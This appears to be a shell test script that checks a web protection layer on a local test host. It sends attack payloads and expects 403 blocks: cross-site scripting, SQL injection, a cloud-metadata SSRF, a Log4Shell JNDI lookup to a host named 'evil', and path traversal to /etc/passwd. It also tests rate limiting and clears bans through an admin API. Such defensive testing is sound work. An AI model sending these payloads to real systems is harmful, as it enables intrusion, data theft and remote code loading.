#!/usr/bin/env sh
set -eu
BASE_URL="${BASE_URL:-http://project.test:8081}"
ADMIN_URL="${ADMIN_URL:-http://127.0.0.1:9191}"
TOKEN="${TOKEN:-dev-security-token}"

for path in \
  '/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E' \
  '/login?username=admin%27%20OR%201%3D1--' \
  '/fetch?url=http://169.254.169.254/latest/meta-data' \
  '/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D' \
  '/download?file=..%2F..%2Fetc%2Fpasswd'; do
  code="$(curl -s -o /dev/null -w '%{http_code}' "$BASE_URL$path")"
  [ "$code" = 403 ] || { echo "expected 403, got $code for $path" >&2; exit 1; }
done

n=1
seen429=0
while [ "$n" -le 60 ]; do
  code="$(curl -s -o /dev/null -w '%{http_code}' "$BASE_URL/flood?i=$n")"
  [ "$code" = 429 ] && seen429=1
  n=$((n+1))
done
[ "$seen429" = 1 ] || { echo 'rate limiter did not return 429' >&2; exit 1; }

curl -fsS -H "Authorization: Bearer $TOKEN" "$ADMIN_URL/api/v1/status"
curl -fsS -H "Authorization: Bearer $TOKEN" "$ADMIN_URL/api/v1/bans"
curl -fsS -X DELETE -H "Authorization: Bearer $TOKEN" "$ADMIN_URL/api/v1/bans"
printf '\nProtection and auto-ban tests completed.\n'
